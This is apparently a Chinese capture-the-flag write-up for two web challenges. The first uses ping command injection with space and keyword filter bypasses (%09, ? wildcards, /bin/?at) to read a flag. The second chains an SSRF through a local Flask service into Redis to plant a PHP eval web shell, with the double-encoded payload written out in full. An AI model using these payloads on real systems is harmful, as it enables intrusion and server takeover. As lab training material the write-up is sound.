题目类型 题目名称

web     command  

操作内容：

首先我们通过这个ping知道这是一道命令执行的题。输入0.0.0.0 -c 1，发现弹出这个弹框![](../Images/1f95c1b35f7090efeed9ca0b19bd80b4.png)输入ls,没回显，试试&ls，发现被过滤，|ls，成功输出3个文件。  
![](../Images/d5ab335dc29131d82fcbd598d89f33de.png)访问这个sou.js发现并没有可用信息。再试试列出根目录文件。|ls /,失败，猜测过滤了空格或者/ 我们再试试绕过空格|ls%09/,成功读取/目录的文件，发现并无flag.![](../Images/7349149db9b69a863135ea7de0bd44e0.png)尝试用find,去寻找flag,|find%09/%09-name%09flag，失败。猜测过滤了flag关键词，我们用|find%09/%09-name%09fl??????,成功看到flag文件。![](../Images/fcba3d06a5ab4f5fccf902d1862dd085.png)尝试用|cat%09/etc/.findfl??/fl??.txt和|'c'at%09/etc/.findfl??/fl??.txt都失败，最后|/bin/?at%09/etc/.findfl??/fl??.txt 成功读取flag.

flag值：

flag{ac028976-a1d5-449a-a691-ce197f1c2bc7}![](../Images/66529994337b50cd8172335ac2f774e6.png)

  

题目类型 题目名称

web   doyouknowssrf  

操作内容：

打开文件是一段php代码，只允许抓取http请求和https请求。通过爆破测试常见端口，发现5000端口下面会有回显，而6379端口响应时间很长，猜测开放了这两个端口。突然想到某CTF也出过类似的题目，这道题参考了文章[https://mp.weixin.qq.com/s/0cOsuIFJwHbHIYvluQq4WQ](https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&mid=2247485646&idx=1&sn=77b31313faa0764843d83648e9abba94&scene=21#wechat_redirect)Payload:http://eci-2ze0f7sk2zkl7a79404p.cloudeci1.ichunqiu.com/?url=http://@127.0.0.1:5000@baidu.com![](../Images/591e78e13aa22d87287c3fb5397b8f3f.png)Payload:  
http://eci-2ze0f7sk2zkl7a79404p.cloudeci1.ichunqiu.com/?url=http://@127.0.0.1:6379@baidu.com![](../Images/6979e2852c92a775e26857f8d419162e.png)根据5000端口的线索，继续尝试payload,  
http://eci-2zebyfcut03ljux0t8hl.cloudeci1.ichunqiu.com/?url=http://root@127.0.0.1:5000@baidu.com%3furl=https://baidu.com成功跳转到百度页面，既然url后可以跟跳转的链接，那我们直接将一句话写入redis数据库并且设置保存路径，然后使用蚁剑连接。注意此时的ssrf是套娃，所以需要进行二次url编码，php解析一次，flask解析一次。  
Payload:url=http://root:root@127.0.0.1:5000@baidu.com/?url=http://127.0.0.1:6379?%250D%250Aflushall%250D%250Aset%25201%2520%2527%253C%253Fphp%2520eval%2528%2524\_POST%255Byeyu%255D%2529%253B%253F%253E%2527%250D%250Aconfig%2520set%2520dir%2520%252fvar%252fwww%252fhtml%250D%250Aconfig%2520set%2520dbfilename%2520shell.php%250D%250Asave%250D%250A%2500成功写入http://eci-2ze9ady2g3fv7n6z7pzx.cloudeci1.ichunqiu.com/shell.php![](../Images/8eaff7bb82f7689823ec70e708516d75.png)使用蚁剑连接,然后查找flag

操作内容：
